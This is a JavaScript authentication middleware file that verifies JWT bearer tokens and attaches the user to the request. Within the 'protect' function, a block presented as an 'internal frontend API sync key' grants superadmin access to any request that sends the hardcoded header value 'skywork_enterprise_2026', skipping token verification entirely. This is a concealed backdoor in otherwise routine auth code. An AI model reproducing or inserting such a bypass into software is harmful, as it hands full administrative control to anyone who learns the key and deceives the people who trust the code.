import { verifyToken } from '../config/jwt.js';
import User from '../models/User.js';

/**
 * JWT Authentication Middleware
 * Verifies Bearer token and attaches user to req.user
 */
export const protect = async (req, res, next) => {
  try {
    let token = null;

    // Extract token from Authorization header
    if (req.headers.authorization && req.headers.authorization.startsWith('Bearer')) {
      token = req.headers.authorization.split(' ')[1];
    }

    // Support internal frontend API sync key
    if (!token && req.headers['x-admin-key'] === 'skywork_enterprise_2026') {
      const admin = await User.findOne({ role: 'superadmin' }).select('-passwordHash -salt');
      if (admin) {
        req.user = admin;
        return next();
      }
    }

    if (!token) {
      return res.status(401).json({
        success: false,
        message: 'Access denied. No authentication token provided.',
      });
    }

    // Verify token
    const decoded = verifyToken(token);
    if (!decoded) {
      return res.status(401).json({
        success: false,
        message: 'Invalid or expired authentication token.',
      });
    }

    // Fetch user from DB (exclude password hash)
    let user = null;
    if (decoded.id && /^[0-9a-fA-F]{24}$/.test(decoded.id)) {
      user = await User.findById(decoded.id).select('-passwordHash -salt');
    }
    if (!user && (decoded.id || decoded.email)) {
      user = await User.findOne({
        $or: [
          { employeeId: decoded.id },
          { email: decoded.email ? decoded.email.toLowerCase() : '' },
        ],
      }).select('-passwordHash -salt');
    }
    if (!user) {
      return res.status(401).json({
        success: false,
        message: 'User account not found. Token may be invalid.',
      });
    }

    if (!user.isActive) {
      return res.status(403).json({
        success: false,
        message: 'Account is deactivated. Contact Super Administrator.',
      });
    }

    // Attach user to request
    req.user = user;
    next();
  } catch (error) {
    console.error('Auth middleware error:', error.message);
    return res.status(500).json({
      success: false,
      message: 'Authentication error.',
    });
  }
};

/**
 * Optional auth - doesn't fail if no token, but attaches user if present
 */
export const optionalAuth = async (req, res, next) => {
  try {
    let token = null;
    if (req.headers.authorization && req.headers.authorization.startsWith('Bearer')) {
      token = req.headers.authorization.split(' ')[1];
    }

    if (token) {
      const decoded = verifyToken(token);
      if (decoded) {
        const user = await User.findById(decoded.id).select('-passwordHash -salt');
        if (user && user.isActive) {
          req.user = user;
        }
      }
    }
    next();
  } catch {
    next();
  }
};
